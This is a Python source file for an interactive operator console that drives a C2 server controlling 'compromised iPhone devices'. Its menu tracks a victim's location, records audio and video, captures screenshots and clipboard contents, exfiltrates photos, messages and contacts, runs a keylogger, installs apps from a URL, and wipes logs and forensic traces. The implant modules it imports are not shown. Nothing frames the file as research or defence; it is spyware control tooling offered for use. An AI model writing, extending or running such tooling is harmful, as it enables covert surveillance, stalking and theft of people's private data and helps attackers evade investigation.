#!/usr/bin/env python3
"""
iPhone Remote Control Interface
Complete control panel for compromised iPhone devices
"""

import asyncio
import json
from pathlib import Path
from datetime import datetime
from iphone_remote_access import iPhoneRemoteControl
from c2_server import C2Client


class iPhoneController:
    """Interactive iPhone control interface"""
    
    def __init__(self, c2_server: str, encryption_key: str):
        self.c2_server = c2_server
        self.encryption_key = encryption_key
        self.controller = None
        self.client = None
        
    async def initialize(self):
        """Initialize controller and client"""
        self.controller = iPhoneRemoteControl(
            c2_server=self.c2_server,
            encryption_key=self.encryption_key
        )
        self.client = C2Client(self.c2_server)
        
    async def list_devices(self):
        """List all compromised devices"""
        print("\n" + "="*80)
        print("Compromised Devices")
        print("="*80)
        
        devices = await self.client.list_devices()
        
        if not devices:
            print("No devices registered")
            return []
        
        for idx, device in enumerate(devices, 1):
            status = "🟢 ONLINE" if device['online'] else "🔴 OFFLINE"
            last_seen = datetime.fromtimestamp(device['last_seen']).strftime("%Y-%m-%d %H:%M:%S")
            
            print(f"\n{idx}. {status} {device['device_id']}")
            print(f"   Last seen: {last_seen}")
            
            info = device.get('info', {})
            if 'status' in info:
                ios_version = info['status'].get('ios_version', 'Unknown')
                jailbroken = info['status'].get('jailbroken', False)
                print(f"   iOS: {ios_version} | Jailbroken: {jailbroken}")
        
        return devices
        
    async def track_location(self, device_id: str):
        """Track device location"""
        print(f"\n[*] Tracking location for {device_id}...")
        location = await self.controller.track_location(device_id)
        
        if location:
            print(f"[+] Location found:")
            print(f"    Latitude: {location.get('latitude')}")
            print(f"    Longitude: {location.get('longitude')}")
            print(f"    Accuracy: {location.get('accuracy')}m")
            print(f"    Timestamp: {datetime.fromtimestamp(location.get('timestamp', 0))}")
            
            # Save to file
            location_file = Path(f"location_{device_id}_{int(location.get('timestamp', 0))}.json")
            location_file.write_text(json.dumps(location, indent=2))
            print(f"[+] Location saved: {location_file}")
        else:
            print("[!] Location not available")
            
    async def capture_screen(self, device_id: str):
        """Capture device screenshot"""
        print(f"\n[*] Capturing screenshot from {device_id}...")
        screenshot = await self.controller.capture_screen(device_id)
        
        if screenshot:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_file = Path(f"screenshot_{device_id}_{timestamp}.png")
            screenshot_file.write_bytes(screenshot)
            print(f"[+] Screenshot saved: {screenshot_file}")
        else:
            print("[!] Screenshot capture failed")
            
    async def exfiltrate_photos(self, device_id: str):
        """Exfiltrate all photos"""
        print(f"\n[*] Exfiltrating photos from {device_id}...")
        print("[*] This may take several minutes...")
        
        await self.controller.exfiltrate_photos(device_id)
        print(f"[+] Photos exfiltrated to: exfiltrated_data/{device_id}/photos/")
        
    async def exfiltrate_messages(self, device_id: str):
        """Exfiltrate messages"""
        print(f"\n[*] Exfiltrating messages from {device_id}...")
        
        await self.controller.exfiltrate_messages(device_id)
        print(f"[+] Messages exfiltrated to: exfiltrated_data/{device_id}/messages/")
        
    async def start_keylogger(self, device_id: str, duration: int = 3600):
        """Start keylogger"""
        print(f"\n[*] Starting keylogger on {device_id}...")
        print(f"[*] Duration: {duration} seconds ({duration//60} minutes)")
        
        result = await self.controller.keylog(device_id, duration)
        if result:
            print(f"[+] Keylogger started")
            print(f"[*] Log file: {result.get('log_file')}")
        else:
            print("[!] Keylogger failed to start")
            
    async def record_audio(self, device_id: str, duration: int = 60):
        """Record audio from microphone"""
        print(f"\n[*] Recording audio from {device_id}...")
        print(f"[*] Duration: {duration} seconds")
        
        result = await self.controller.execute_command(
            device_id, 'record_audio', {'duration': duration}
        )
        
        if result and result.get('data'):
            import base64
            audio_data = base64.b64decode(result['data'])
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            audio_file = Path(f"audio_{device_id}_{timestamp}.m4a")
            audio_file.write_bytes(audio_data)
            print(f"[+] Audio saved: {audio_file}")
        else:
            print("[!] Audio recording failed")
            
    async def record_video(self, device_id: str, duration: int = 30):
        """Record video from camera"""
        print(f"\n[*] Recording video from {device_id}...")
        print(f"[*] Duration: {duration} seconds")
        
        result = await self.controller.execute_command(
            device_id, 'record_video', {'duration': duration}
        )
        
        if result and result.get('data'):
            import base64
            video_data = base64.b64decode(result['data'])
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            video_file = Path(f"video_{device_id}_{timestamp}.mp4")
            video_file.write_bytes(video_data)
            print(f"[+] Video saved: {video_file}")
        else:
            print("[!] Video recording failed")
            
    async def exfiltrate_contacts(self, device_id: str):
        """Exfiltrate contacts"""
        print(f"\n[*] Exfiltrating contacts from {device_id}...")
        
        result = await self.controller.execute_command(device_id, 'exfiltrate_contacts')
        
        if result and result.get('data'):
            import base64
            contacts_data = base64.b64decode(result['data'])
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            contacts_file = Path(f"contacts_{device_id}_{timestamp}.db")
            contacts_file.write_bytes(contacts_data)
            print(f"[+] Contacts saved: {contacts_file}")
        else:
            print("[!] Contacts exfiltration failed")
            
    async def monitor_clipboard(self, device_id: str):
        """Monitor clipboard"""
        print(f"\n[*] Monitoring clipboard on {device_id}...")
        
        result = await self.controller.execute_command(device_id, 'monitor_clipboard')
        
        if result and result.get('content'):
            print(f"[+] Clipboard content:")
            print(f"    {result['content']}")
            print(f"    Timestamp: {datetime.fromtimestamp(result.get('timestamp', 0))}")
        else:
            print("[!] Clipboard is empty or monitoring failed")
            
    async def cleanup_traces(self, device_id: str):
        """Clean up all forensic traces"""
        print(f"\n[*] Cleaning up traces on {device_id}...")
        print("[*] This will:")
        print("    - Clear system logs")
        print("    - Remove artifacts")
        print("    - Reset timestamps")
        print("    - Clear caches")
        
        confirm = input("\nAre you sure? (yes/no): ")
        if confirm.lower() != 'yes':
            print("[*] Cleanup cancelled")
            return
            
        await self.controller.cleanup_traces(device_id)
        print("[+] Cleanup complete")
        
    async def install_app(self, device_id: str, ipa_url: str):
        """Install app on device"""
        print(f"\n[*] Installing app on {device_id}...")
        print(f"[*] IPA URL: {ipa_url}")
        
        result = await self.controller.install_app(device_id, ipa_url)
        if result:
            print(f"[+] App installation: {result.get('status')}")
        else:
            print("[!] App installation failed")
            
    async def show_menu(self, device_id: str):
        """Show control menu"""
        while True:
            print("\n" + "="*80)
            print(f"iPhone Control Panel - {device_id}")
            print("="*80)
            print("\n[Surveillance]")
            print("1.  Track Location")
            print("2.  Capture Screenshot")
            print("3.  Record Audio")
            print("4.  Record Video")
            print("5.  Monitor Clipboard")
            
            print("\n[Data Exfiltration]")
            print("6.  Exfiltrate Photos")
            print("7.  Exfiltrate Messages")
            print("8.  Exfiltrate Contacts")
            print("9.  Start Keylogger")
            
            print("\n[Management]")
            print("10. Install App")
            print("11. Cleanup Traces")
            print("12. Back to Device List")
            print("0.  Exit")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == '1':
                await self.track_location(device_id)
            elif choice == '2':
                await self.capture_screen(device_id)
            elif choice == '3':
                duration = int(input("Duration (seconds) [60]: ") or "60")
                await self.record_audio(device_id, duration)
            elif choice == '4':
                duration = int(input("Duration (seconds) [30]: ") or "30")
                await self.record_video(device_id, duration)
            elif choice == '5':
                await self.monitor_clipboard(device_id)
            elif choice == '6':
                await self.exfiltrate_photos(device_id)
            elif choice == '7':
                await self.exfiltrate_messages(device_id)
            elif choice == '8':
                await self.exfiltrate_contacts(device_id)
            elif choice == '9':
                duration = int(input("Duration (seconds) [3600]: ") or "3600")
                await self.start_keylogger(device_id, duration)
            elif choice == '10':
                ipa_url = input("IPA URL: ").strip()
                await self.install_app(device_id, ipa_url)
            elif choice == '11':
                await self.cleanup_traces(device_id)
            elif choice == '12':
                break
            elif choice == '0':
                return False
            else:
                print("[!] Invalid option")
                
            input("\nPress Enter to continue...")
            
        return True
        
    async def run(self):
        """Run interactive control panel"""
        print("\n" + "="*80)
        print("iPhone Remote Access Control Panel")
        print("="*80)
        
        await self.initialize()
        
        while True:
            devices = await self.list_devices()
            
            if not devices:
                print("\n[!] No devices available")
                break
                
            print("\nSelect device number (or 0 to exit): ", end='')
            choice = input().strip()
            
            if choice == '0':
                break
                
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(devices):
                    device = devices[idx]
                    device_id = device['device_id']
                    
                    if not device['online']:
                        print(f"[!] Device {device_id} is offline")
                        input("Press Enter to continue...")
                        continue
                        
                    if not await self.show_menu(device_id):
                        break
                else:
                    print("[!] Invalid device number")
            except ValueError:
                print("[!] Invalid input")
                
        await self.controller.close()
        print("\n[*] Goodbye!")


async def main():
    """Main entry point"""
    print("="*80)
    print("iPhone Remote Access Control Panel")
    print("="*80)
    
    # Configuration
    c2_server = input("C2 Server URL [http://localhost:9443]: ").strip() or "http://localhost:9443"
    
    # Try to load encryption key from file
    encryption_key = None
    if Path(".encryption_key").exists():
        encryption_key = Path(".encryption_key").read_text().strip()
        print(f"[+] Loaded encryption key from .encryption_key")
    else:
        encryption_key = input("Encryption Key: ").strip()
    
    if not encryption_key:
        print("[!] Encryption key is required")
        return
        
    # Initialize and run controller
    controller = iPhoneController(c2_server, encryption_key)
    await controller.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[*] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
